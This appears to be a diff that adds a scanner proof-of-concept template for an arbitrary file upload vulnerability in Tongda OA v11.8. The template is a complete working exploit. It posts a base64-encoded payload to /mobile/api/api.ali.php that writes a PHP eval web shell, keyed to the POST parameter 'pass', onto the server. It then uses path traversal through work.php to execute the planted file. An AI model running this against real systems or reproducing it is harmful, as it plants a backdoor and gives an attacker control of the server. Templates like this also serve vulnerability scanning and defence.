@@ -1,0 +1,37 @@
+expression: r0() && r1()
+id: tongda-oa-api-ali-upload
+info:
+    author: daffainfo
+    description: |
+        通达OA（OfficeAnywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。通达存在任意文件上传漏洞，攻击者可以通过指定接口上传任意文件，获取服务器管理权限。
+        fofa-query: app="TDXK-通达OA"
+    name: 通达OA v11.8 api.ali.php任意文件上传漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/G6tSTQGl31xYgpMQnNx0dw
+    severity: critical
+    tags:
+        - 通达信
+        - 通达oa
+        - TDXK-通达OA
+        - tongda
+    verified: true
+rules:
+    r0:
+        expression: response.status == 200
+        request:
+            body: "--WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"fb6790f7.json\"\r\nContent-Type: application/octet-stream\r\n\r\n{\"modular\":\"AllVariable\",\"a\":\"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY3LnBocCcsJzw/cGhwIGV2YWwoJF9QT1NUWyJwYXNzIl0pOycpOw==\",\"dataAnalysis\":\"{\"a\":\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"}\"}\r\n--WebKitFormBoundary{{rboundary}}--"
+            headers:
+                Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
+            method: POST
+            path: /mobile/api/api.ali.php
+    r1:
+        expression: response.status == 200 && response.body.bcontains(b'+OK')
+        request:
+            headers:
+                Cookie: PHPSESSID=8qabkksg1gs817uq8m5rlt2ja5; KEY_RANDOMDATA=18588
+            method: GET
+            path: /inc/package/work.php?id=../../../../../myoa/attach/approve_center/{{pathname}}/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f7
+set:
+    hosturl: request.url
+    pathname: shortyear(0) + month(0)
+    rboundary: randomLowercase(8)
